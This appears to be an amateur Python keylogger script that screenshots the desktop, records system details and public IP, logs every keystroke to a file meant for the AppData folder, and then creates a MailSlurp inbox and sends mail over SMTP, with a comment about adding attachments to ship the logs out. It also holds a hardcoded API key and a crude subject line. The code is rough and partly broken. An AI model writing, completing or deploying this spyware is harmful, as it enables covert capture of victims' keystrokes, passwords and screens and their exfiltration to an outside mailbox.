from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from os import access
import mailslurp_client
from requests import options
from smtplib import SMTP

import socket
import platform

#import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information= "systeminfo.txt"
screenshot_information= "screenshots.png"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"

#file_path to be changed to C:\Users\Geek\AppData\Roaming
file_path = os.getcwd()
extend="\\"

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+screenshot_information )
screenshot()

def computer_information():
    with open(file_path+extend+system_information,"a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPaddr + "\n")
computer_information()
 

count = 0
keys=[]
def on_press(key):
    global keys,count
    print(key) #remove this
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open(file_path+extend+keys_information,"a") as f:
        print("file opened in roaming succesffully")
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                f.close()
            elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
                f.write("[shift] \n")
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                f.write("[ctrl] \n")
            elif key == Key.alt_l or key == Key.alt_gr:
                f.write("[alt] \n")
            elif key==Key.enter:
                f.write("[enter] \n")
            elif key == Key.backspace:
                f.write("[backspace] \n")
            elif key==Key.caps_lock:
                f.write("[caps_lock] \n")
            elif key==Key.tab:
                f.write("[tab] \n")
            elif key==Key.end:
                f.write("[end] \n")
            elif key==Key.home:
                f.write("[home] \n")
            elif key==Key.page_down:
                f.write("[page_down] \n")
            elif key==Key.page_up:
                f.write("[page_up] \n")
            elif key==Key.pause:
                f.write("[pause] \n")
            elif key==Key.insert:
                f.write("[insert] \n")
            elif key==Key.up:
                f.write("[up] \n")
            elif key==Key.down:
                f.write("[down] \n")
            elif key==Key.right:
                f.write("[right] \n")
            elif key==Key.left:
                f.write("[left] \n")
            elif key==Key.delete:
                f.write("[delete] \n")
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


# create a mailslurp configuration
configuration = mailslurp_client.Configuration()
configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
with mailslurp_client.ApiClient(configuration) as api_client:
    # create an inbox
    inbox_controller = mailslurp_client.InboxControllerApi(api_client)
    options = mailslurp_client.CreateInboxDto()
    options.name = "data"
    options.inbox_type="SMTP_INBOX"
    inbox = inbox_controller.create_inbox_with_options(options)
    print("email address is " + inbox.email_address)
    
access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
print(access_details)
print("sending")
with SMTP(
    host=access_details.smtp_server_host,
    port= access_details.smtp_server_port,
) as smtp:
    msg="Subject: I LOVE COCK AND BALLS\r\n\r\nThis is my body" #have to add attachments 
    smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
    smtp.sendmail(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
    smtp.quit()
print("check your mail :)")